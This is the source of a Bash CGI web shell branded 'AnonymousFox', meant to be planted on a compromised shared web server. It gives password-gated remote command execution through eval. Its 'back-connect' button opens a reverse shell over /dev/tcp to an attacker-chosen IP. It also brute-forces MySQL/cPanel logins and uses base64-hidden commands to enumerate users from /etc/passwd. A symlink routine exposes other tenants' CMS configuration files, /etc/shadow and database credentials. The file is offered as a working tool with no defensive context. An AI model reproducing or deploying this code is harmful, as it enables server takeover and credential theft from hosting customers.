#!/bin/bash -i

#
password="xXx"


function cgi_get_POST_vars()
{
    # check content type
    [ "${CONTENT_TYPE}" != "application/x-www-form-urlencoded" ] && \
	echo "Warning: you should probably use MIME type "\
	     "application/x-www-form-urlencoded!" 1>&2
    # save POST variables (only first time this is called)
    [ -z "$QUERY_STRING_POST" \
      -a "$REQUEST_METHOD" = "POST" -a ! -z "$CONTENT_LENGTH" ] && \
	read -n $CONTENT_LENGTH QUERY_STRING_POST
    return
}


function cgi_decodevar()
{
    [ $# -ne 1 ] && return
    local v t h
    
    t="${1//+/ }%%"
    while [ ${#t} -gt 0 -a "${t}" != "%" ]; do
	v="${v}${t%%\%*}" 
	t="${t#*%}"       
	
	if [ ${#t} -gt 0 -a "${t}" != "%" ]; then
	    h=${t:0:2} 
	    t="${t:2}" 
	    v="${v}"`echo -e \\\\x${h}` 
	fi
    done
    
    echo "${v}"
    return
}


function cgi_getvars()
{
    [ $# -lt 2 ] && return
    local q p k v s
    # get query
    case $1 in
	GET)
	    [ ! -z "${QUERY_STRING}" ] && q="${QUERY_STRING}&"
	    ;;
	POST)
	    cgi_get_POST_vars
	    [ ! -z "${QUERY_STRING_POST}" ] && q="${QUERY_STRING_POST}&"
	    ;;
	BOTH)
	    [ ! -z "${QUERY_STRING}" ] && q="${QUERY_STRING}&"
	    cgi_get_POST_vars
	    [ ! -z "${QUERY_STRING_POST}" ] && q="${q}${QUERY_STRING_POST}&"
	    ;;
    esac
    shift
    s=" $* "
    # parse the query data
    while [ ! -z "$q" ]; do
	p="${q%%&*}"  # get first part of query string
	k="${p%%=*}"  # get the key (variable name) from it
	v="${p#*=}"   # get the value from it
	q="${q#$p&*}" # strip first part from query string
	# decode and evaluate var if requested
	[ "$1" = "ALL" -o "${s/ $k /}" != "$s" ] && \
	    eval "$k=\"`cgi_decodevar \"$v\"`\""
    done
    return
}

# register all GET and POST variables
cgi_getvars BOTH ALL

pass="SAVEDPWD=$password"
passv=`echo $HTTP_COOKIE | awk '$pass|'  -f0`

if [ $cc2 -eq 4 ] ; then
clear
echo -e "Set-Cookie: SAVEDPWD=;\nContent-type: text/html\n\n"
echo '<meta http-equiv="refresh" content="0;">'
exit
else

if [ -n "$xx"  ] ; then
echo -e "Set-Cookie: SAVEDPWD=$xx;\nContent-type: text/html\n\n"
echo '<meta http-equiv="refresh" content="0;">'
else
echo -e "Content-type: text/html\n\n"
fi

fi
echo 'PGh0bWw+PHRpdGxlPkFub255bW91c0ZveCBTaGVsbDwvdGl0bGU+CjxoZWFkPgo8c3R5bGU+Cgpi
b2R5CnsKCWJhY2tncm91bmQ6ICMzMzM7Cgljb2xvcjogI0Y1RjVGNTsKCglwYWRkaW5nOiAxMHB4
OwoKfQoKCmE6bGluaywgYm9keV9hbGluawp7Cgljb2xvcjogI0ZGOTkzMzsKCXRleHQtZGVjb3Jh
dGlvbjogbm9uZTsKfQphOnZpc2l0ZWQsIGJvZHlfYXZpc2l0ZWQKewoJY29sb3I6ICNGRjk5MzM7
Cgl0ZXh0LWRlY29yYXRpb246IG5vbmU7Cn0KYTpob3ZlciwgYTphY3RpdmUsIGJvZHlfYWhvdmVy
CnsKCWNvbG9yOiAjRkZGRkZGOwoJdGV4dC1kZWNvcmF0aW9uOiBub25lOwp9Cgp0ZXh0YXJlYQp7
Cglib3JkZXI6IDFweCBzb2xpZDsKCWN1cnNvcjogZGVmYXVsdDsKCQoJYmFja2dyb3VuZDogIzAw
MDsKCWNvbG9yOiAjZmZmZmZmOwpib3JkZXI6MXB4IHNvbGlkICNhMWExYTE7CnBhZGRpbmc6NXB4
IDIwcHg7IApib3JkZXItcmFkaXVzOjI1cHg7Ci1tb3otYm9yZGVyLXJhZGl1czoyNXB4OyAvKiBG
aXJlZm94IDMuNiBhbmQgZWFybGllciAqLwoKfQoKaW5wdXQKewoJYm9yZGVyOiAxcHggc29saWQ7
CgljdXJzb3I6IGRlZmF1bHQ7CglvdmVyZmxvdzogaGlkZGVuOwoJYmFja2dyb3VuZDogIzAwMDsK
CWNvbG9yOiAjZmZmZmZmOwpib3JkZXI6MXB4IHNvbGlkICNhMWExYTE7CnBhZGRpbmc6NXB4IDIw
cHg7IApib3JkZXItcmFkaXVzOjI1cHg7Ci1tb3otYm9yZGVyLXJhZGl1czoyNXB4OyAvKiBGaXJl
Zm94IDMuNiBhbmQgZWFybGllciAqLwoKfQppbnB1dC5idXR0b24gewpmb250LWZhbWlseTogQ291
cmllciBOZXc7CmNvbG9yOiAjZmZmZmZmOwpmb250LXNpemU6IDE2cHg7CnBhZGRpbmc6IDEwcHg7
CnRleHQtZGVjb3JhdGlvbjogbm9uZTsKLXdlYmtpdC1ib3JkZXItcmFkaXVzOiA4cHg7Ci1tb3ot
Ym9yZGVyLXJhZGl1czogOHB4Owotd2Via2l0LWJveC1zaGFkb3c6IDBweCAxcHggM3B4ICNhYmFi
YWI7Ci1tb3otYm94LXNoYWRvdzogMHB4IDFweCAzcHggI2FiYWJhYjsKdGV4dC1zaGFkb3c6IDFw
eCAxcHggM3B4ICM2NjY2NjY7CmJvcmRlcjogc29saWQgI2RlZGJkZSAxcHg7CmJhY2tncm91bmQ6
ICM5MDkwOTAgOwp9Ci5idXR0b246aG92ZXIgewpiYWNrZ3JvdW5kOiAjQjBCMEIwOwp9CgogZGl2
LmJveAp7CmNvbG9yOiAjMzMzOwpib3JkZXI6M3B4IHNvbGlkICNhMWExYTE7CnBhZGRpbmc6MTBw
eCA0MHB4OyAKYmFja2dyb3VuZDojZThlOGU4Owp3aWR0aDo5NCU7CmJvcmRlci1yYWRpdXM6MjVw
eDsKLW1vei1ib3JkZXItcmFkaXVzOjI1cHg7IC8qIEZpcmVmb3ggMy42IGFuZCBlYXJsaWVyICov
Cn0KPC9zdHlsZT4KPC9oZWFkPgo8Ym9keT4KPGNlbnRlcj4KPHByZT4KPGNlbnRlcj48aW1nIHNy
Yz0iaHR0cDovL2QudG9wNHRvcC5uZXQvcF8yNDlhNGlqMS5wbmciPjwvY2VudGVyPgo8L3ByZT4K
CjxkaXYgYWxpZ249ImNlbnRlciI+' | base64 -d

 function login()
{
echo 'RW50ZXIgcGFzc3dvcmQ8YnI+Cjxicj48Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4KCQoJ
PGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+Cgk8ZGl2IGFsaWduPSJjZW50ZXIiPjx0YWJs
ZSBib3JkZXI9IjAiIHdpZHRoPSIxMjAiIGlkPSJ0YWJsZTEiIGNlbGxzcGFjaW5nPSIwIiBjZWxs
cGFkZGluZz0iMCI+PHRyPjx0ZCA+CjxpbnB1dCB0eXBlPSJwYXNzd29yZCIgbmFtZT0ieHgiIHNp
emU9IjEwMCIgdmFsdWU9IiIvPgo8L3RkPjx0ZD48aW5wdXQgdHlwZT0ic3VibWl0IiBuYW1lPSJi
dXR0b24xIiB2YWx1ZT0iU2VuZCIgLz48L3RkPjwvdHI+PC90YWJsZT48L2Rpdj48L2Zvcm0+PGJy
Pjxicj4KPGJyPjxicj48aHI+CjxjZW50ZXI+Q29kZWQgYnkgQW5vbnltb3VzRm94PC9jZW50ZXI+' | base64 -d

  return

	}
	



    echo "$HTTP_COOKIE" | grep -qi "$pass"
    if [ $? == 0 ]
    then
    echo ""
    else
login
exit
    fi
	

echo 'PHRhYmxlIGJvcmRlcj0wPjx0cj48dGQ+PGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+IA0KPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+IA0KCTxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPgkJPGlucHV0IGNsYXNzPSJidXR0b24iIHR5cGU9InN1Ym1pdCIgbmFtZT0iYnV0dG9uIiB2YWx1ZT0iICAgSG9tZSAgICAiIC8+DQoJPC9mb3JtPg0KCTwvdGQ+PHRkPg0KCTxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjYzIiIHZhbHVlPSIxIiAgLz4gCTxpbnB1dCBjbGFzcz0iYnV0dG9uIiB0eXBlPSJzdWJtaXQiIG5hbWU9ImJ1dHRvbiIgdmFsdWU9IiAgIFNob3cgVXNlciAgICAiIC8+DQoJPC9mb3JtPg0KPC90ZD4NCjx0ZD4NCjxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPg0KCQ0KCTxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPg0KCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9ImNjMiIgdmFsdWU9IjIiICAvPg0KCQk8aW5wdXQgY2xhc3M9ImJ1dHRvbiIgdHlwZT0ic3VibWl0IiBuYW1lPSJidXR0b24iIHZhbHVlPSIgU2hvdyAgIERvbWFpbnMgIiAvPg0KCTwvZm9ybT4NCjwvdGQ+DQo8dGQ+DQo8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4NCgkNCgk8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4NCgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjYzIiIHZhbHVlPSIzIiAgLz4NCgkNCgk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnV0dG9uIiBuYW1lPSJidXR0b24iIHZhbHVlPSJDcmVhdCAgLi4vc3ltbGluayIgLz4NCgk8L2Zvcm0+DQo8L3RkPg0KDQo8dGQ+DQo8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4NCgkNCgk8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4NCgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjYzIiIHZhbHVlPSI1IiAgLz4NCgkNCgk8aW5wdXQgdHlwZT0ic3VibWl0IiBjbGFzcz0iYnV0dG9uIiBuYW1lPSJidXR0b24iIHZhbHVlPSJDcGFuZWwiIC8+DQoJPC9mb3JtPg0KPC90ZD4NCg0KPHRkPg0KPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+DQoJDQoJPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249IiI+DQoJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0iY2MyIiB2YWx1ZT0iNyIgIC8+DQoJDQoJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ1dHRvbiIgbmFtZT0iYnV0dG9uIiB2YWx1ZT0iQkFDSy1DT05ORUNUIiAvPg0KCTwvZm9ybT4NCjwvdGQ+DQo8L3RyPjwvdGFibGU+DQogDQo8L2Rpdj4NCg0KPC9jZW50ZXI+' | base64 -d
if [ $cc2 -eq 7 ] ; then
echo '<br><form method="post" action="">
	
	<form method="post" action="">
	<div align="center">'
echo 'IP <input type="text" name="bip" size="50" value="';echo $REMOTE_ADDR;echo '"/><br>
Port <input type="text" name="bport" size="50" value="443"/></form><br><br>
<input type="hidden" name="cc2" value="8"  /><br>
<input type="submit" class="button" name="button" value="CONNECT" />'
echo "<br><br><hr><center>"
fi
if [ $cc2 -eq 8 ] ; then
bash -i >& /dev/tcp/$bip/$bport 0>&1
fi
if [ $cc2 -eq 6 ] ; then
echo '<pre>'



arr1=$(echo $listu | tr "\r" "\n")
arr2=$(echo $listp | tr "\r" "\n")
echo "<table border='0' width='100%'><tr><td align='center'><div class='box' align='left'><xmp>"
for x in $arr1
do
for y in $arr2
do
mysql -u$x -p$y  ;

if [ $? -eq 0 ] ; then
echo "Found Cpanel User $x Password ($y)"
fi

done
done
echo "</xmp></div></pre></td></tr></table>"
fi
if [ $cc2 -eq 5 ] ; then
echo '<form method="post" action="">
	<center> 
	<form method="post" action="">
Users
<br>
<textarea name="listu" cols="50" rows="15">'
eval `echo Y2F0IC9ldGMvcGFzc3dkIHxncmVwIC9ob21lIHxjdXQgLWQiOiIgLWYxIA== | base64 -d`;echo '</textarea>
<br>
Password
<br>
<textarea name="listp" cols="50" rows="15">123
1234
12345
123456
1234567
123456789
1234567890
123123
123321</textarea>

	<input type="hidden" name="cc2" value="6"  />
	<br>
	<br>
	<input type="submit" class="button" name="button" value="Send" />
	</form>
	<center>
'

fi





if [ $cc2 -eq 1 ] ; then
echo '<div align="center">'
echo "<xmp>"
eval `echo Y2F0IC9ldGMvcGFzc3dkIHxncmVwIC9ob21lIHxjdXQgLWQiOiIgLWYxIA== | base64 -d`
echo "</xmp>"
echo "</div>"
fi

if [ $cc2 -eq 2 ] ; then
echo "<br><center><table border='1' width='45%' cellspacing='0' bordercolor='#a3a3a3' cellpadding='0' align='center'><tr><td bgcolor='#000000' align='center'>Domain</td><td align='center' bgcolor='#000000'>User</td></tr>"

for i in `cat /etc/named.conf | uniq |grep '^zone' |grep -v '"."' |grep -v '"0.0.127.in-addr.arpa"' |cut -d ' ' -f 2  |cut -d '"' -f 2| sort | uniq `; do echo "<td align='center'>$i</td><td align='center'>" ; ls -dl /etc/valiases/$i |cut -d ' ' -f 3 ; echo "</td></tr>"; done

echo "</table></center><br>"
fi

if [ $cc2 -eq 3 ] ; then
echo "<xmp>"
mkdir ../.F0x
mkdir ../.F0x/.F0xSym
mkdir ../.F0x/.F0xConfig
mkdir ../.F0x/.F0xJump
mkdir ../.F0x/.F0xUpload
mkdir ../.F0x/.F0xHtaccess
mkdir ../.F0x/.F0xContactEmail
mkdir ../.F0x/.F0xData
mkdir ../.F0x/.F0xData/.F0xSDU
mkdir ../.F0x/.F0xData/.cPanel 
 echo  DirectoryIndex ssssss.htm >> ../.F0x/.htaccess 
 echo  AddType txt .php >> ../.F0x/.htaccess 
 echo  AddHandler txt .php >> ../.F0x/.htaccess 
 echo   AddType txt .html >> ../.F0x/.htaccess 
 echo  AddHandler txt .html >> ../.F0x/.htaccess 
 echo  Options all >> ../.F0x/.htaccess 
 echo 'ReadmeName AnonymousFox.txt' >> ../.F0x/.htaccess
 echo 'Q29kZWQgYnkgQW5vbnltb3VzRm94IDsp'| base64 -d > ../.F0x/AnonymousFox.txt
 echo 'ReadmeName /.F0x/AnonymousFox.txt' >> ../.F0x/.F0xSym/.htaccess
 echo 'ReadmeName /.F0x/AnonymousFox.txt' >> ../.F0x/.F0xConfig/.htaccess
 echo 'ReadmeName /.F0x/AnonymousFox.txt' >> ../.F0x/.F0xJump/.htaccess
 echo 'ReadmeName /.F0x/AnonymousFox.txt' >> ../.F0x/.F0xUpload/.htaccess
 echo 'ReadmeName /.F0x/AnonymousFox.txt' >> ../.F0x/.F0xHtaccess/.htaccess
 echo 'ReadmeName /.F0x/AnonymousFox.txt' >> ../.F0x/.F0xContactEmail/.htaccess
 echo 'ReadmeName /.F0x/AnonymousFox.txt' >> ../.F0x/.F0xData/.htaccess
 echo 'ReadmeName /.F0x/AnonymousFox.txt' >> ../.F0x/.F0xData/.F0xSDU/.htaccess
 echo 'ReadmeName /.F0x/AnonymousFox.txt' >> ../.F0x/.F0xData/.cPanel/.htaccess
for i in `cd /etc ;cat passwd |grep /home |cut -d":" -f1` ; do
eval "ln -s / ../.F0x/.F0xSym/r00t" ;
eval "ln -s /home/$i/public_html/ ../.F0x/.F0xJump/0-$i" ;
eval "ln -s /home/$i/public_html/clientarea/configuration.php ../.F0x/.F0xConfig/$i-clientarea.txt";
eval "ln -s /home/$i/public_html/clients/configuration.php ../.F0x/.F0xConfig/$i-client.txt";
eval "ln -s /home/$i/public_html/configuration.php ../.F0x/.F0xConfig/$i-whmcsorjoomla.txt";
eval "ln -s /home/$i/public_html/billing/configuration.php ../.F0x/.F0xConfig/$i-billing.txt";
eval "ln -s /home/$i/public_html/billings/configuration.php ../.F0x/.F0xConfig/$i-billings.txt";
eval "ln -s /home/$i/public_html/whmcs/configuration.php ../.F0x/.F0xConfig/$i-whmcs2.txt";
eval "ln -s /home/$i/public_html/portal/configuration.php ../.F0x/.F0xConfig/$i-whmcs3.txt";
eval "ln -s /home/$i/public_html/my/configuration.php ../.F0x/.F0xConfig/$i-whmcs4.txt";
eval "ln -s /home/$i/public_html/whm/configuration.php ../.F0x/.F0xConfig/$i-whm.txt";
eval "ln -s /home/$i/public_html/whmc/configuration.php ../.F0x/.F0xConfig/$i-whmc.txt";
eval "ln -s /home/$i/public_html/support/configuration.php ../.F0x/.F0xConfig/$i-support.txt";
eval "ln -s /home/$i/public_html/supports/configuration.php ../.F0x/.F0xConfig/$i-supports.txt";
eval "ln -s /home/$i/public_html/vb/includes/config.php ../.F0x/.F0xConfig/$i-vb.txt";
eval "ln -s /home/$i/public_html/includes/config.php ../.F0x/.F0xConfig/$i-vb2.txt";
eval "ln -s /home/$i/public_html/config.php ../.F0x/.F0xConfig/$i-2.txt";
eval "ln -s /home/$i/public_html/forum/includes/config.php ../.F0x/.F0xConfig/$i-forum.txt";
eval "ln -s /home/$i/public_html/forums/includes/config.php ../.F0x/.F0xConfig/$i-forums.txt";
eval "ln -s /home/$i/public_html/admin/conf.php ../.F0x/.F0xConfig/$i-5.txt";
eval "ln -s /home/$i/public_html/admin/config.php ../.F0x/.F0xConfig/$i-4.txt";
eval "ln -s /home/$i/public_html/wp-config.php ../.F0x/.F0xConfig/$i-wordpress.txt";
eval "ln -s /home/$i/public_html/blog/wp-config.php ../.F0x/.F0xConfig/$i-wordpress2.txt";
eval "ln -s /home/$i/public_html/conf_global.php ../.F0x/.F0xConfig/$i-6.txt";
eval "ln -s /home/$i/public_html/include/db.php ../.F0x/.F0xConfig/$i-7.txt";
eval "ln -s /home/$i/public_html/connect.php ../.F0x/.F0xConfig/$i-8.txt";
eval "ln -s /home/$i/public_html/mk_conf.php ../.F0x/.F0xConfig/$i-9.txt";
eval "ln -s /home/$i/public_html/joomla/configuration.php ../.F0x/.F0xConfig/$i-joomla.txt";
eval "ln -s /home/$i/public_html/web/configuration.php ../.F0x/.F0xConfig/$i-joomla2.txt";
eval "ln -s /home/$i/public_html/portal/configuration.php ../.F0x/.F0xConfig/$i-joomla2.txt";
eval "ln -s /home/$i/public_html/sites/default/settings.php ../.F0x/.F0xConfig/$i-drupal.txt";
eval "ln -s /home/$i/public_html/drupal/sites/default/settings.php ../.F0x/.F0xConfig/$i-drupal2.txt";
eval "ln -s /home/$i/public_html/include/config.php ../.F0x/.F0xConfig/$i-10.txt";
eval "ln -s /home/$i/.contactemail ../.F0x/.F0xContactEmail/$i-contactemail.txt";
eval "ln -s /home/$i/public_html/.htaccess ../.F0x/.F0xHtaccess/$i-htaccess.txt";
eval "ln -s /home/$i/public_html/images/ ../.F0x/.F0xUpload/$i-images";
eval "ln -s /home/$i/public_html/wp-content/uploads/ ../.F0x/.F0xUpload/$i-uploads";
eval "ln -s /home/$i/public_html/tmp/ ../.F0x/.F0xUpload/$i-tmp";
eval "ln -s /home/$i/public_html/system/logs/ ../.F0x/.F0xUpload/$i-logs";
eval "ln -s /home/$i/public_html/system/storage/logs/ ../.F0x/.F0xUpload/$i-slogs";
eval "ln -s /var/log/domlogs/$i/ ../.F0x/.F0xData/.F0xSDU/$i-SDU";
eval "ln -s /etc/passwd ../.F0x/.F0xData/passwd.txt";
eval "ln -s /etc/shadow ../.F0x/.F0xData/shadow.txt";
eval "ln -s /etc/named.conf ../.F0x/.F0xData/named.conf.txt";
eval "ln -s /home/$i/.my.cnf ../.F0x/.F0xData/.cPanel/$i-cPanel.txt" ;
eval "ln -s /var/named/ ../.F0x/.F0xData/.DomainDB" ;
done
echo 'PC94bXA+PGRpdiBhbGlnbj0nY2VudGVyJz48YnI+IFN5bUxpbmtzIDxhIHRhcmdldD0nX2JsYW5r
JyBocmVmPScuLi8uRjB4Jz5DbGljayBoZXJlPC9hPiA8L2Rpdj4=' | base64 -d
fi
if [ -n "$cc"  ] ; then
echo "<table border='0' width='100%'><tr><td align='center'><div class='box' align='left'><xmp>"
cd $d 
eval $cc
echo $?
echo '</xmp></div></pre></td></tr></table><br><br>'
fi
echo 'PGJyPjxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPg0KCQ0KCTxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSIiPg0KCTxkaXYgYWxpZ249ImNlbnRlciI+PHRhYmxlIGJvcmRlcj0iMCIgd2lkdGg9IjEyMCIgaWQ9InRhYmxlMSIgY2VsbHNwYWNpbmc9IjAiIGNlbGxwYWRkaW5nPSIwIj48dHI+PHRkIHdpZHRoPSI3MTIiPjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJjYyIgc2l6ZT0iMTAwIiAgLz48L3RkPjx0ZD48L3RkPjwvdHI+PHRyPjx0ZCB3aWR0aD0iNzEyIj4NCjxpbnB1dCB0eXBlPSJ0ZXh0IiBuYW1lPSJkIiBzaXplPSIxMDAiIHZhbHVlPSI=' | base64 -d
pwd  
echo 'Ii8+CjwvdGQ+PHRkPjxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9ImJ1dHRvbjEiIHZhbHVlPSJT
ZW5kIiAvPjwvdGQ+PC90cj48L3RhYmxlPjwvZGl2PjwvZm9ybT48YnI+PGJyPgo8YnI+PGJyPjxo
cj48Y2VudGVyPgo8Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iIj4KCQoJPGZvcm0gbWV0aG9k
PSJwb3N0IiBhY3Rpb249IiI+Cgk8aW5wdXQgdHlwZT0iaGlkZGVuIiBuYW1lPSJjYzIiIHZhbHVl
PSI0IiAgLz4KCQoJPGlucHV0IHR5cGU9InN1Ym1pdCIgY2xhc3M9ImJ1dHRvbiIgbmFtZT0iYnV0
dG9uIiB2YWx1ZT0iTG9nb3V0IiAvPgoJPC9mb3JtPg==' | base64 -d

echo '<link href="http://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css">
<center><font style="color:white;text-shadow:0px 1px 5px #000;font-size:30px" face="Iceland">Coder </font><font style="color:black;text-shadow:0px 1px 5px #000;font-size:30px" face="Iceland">:</font><font style="color:red;text-shadow:0px 1px 5px #000;font-size:30px" face="Iceland"> AnonymousFox</font></center>
<br>
</BODY>
</HTML>'
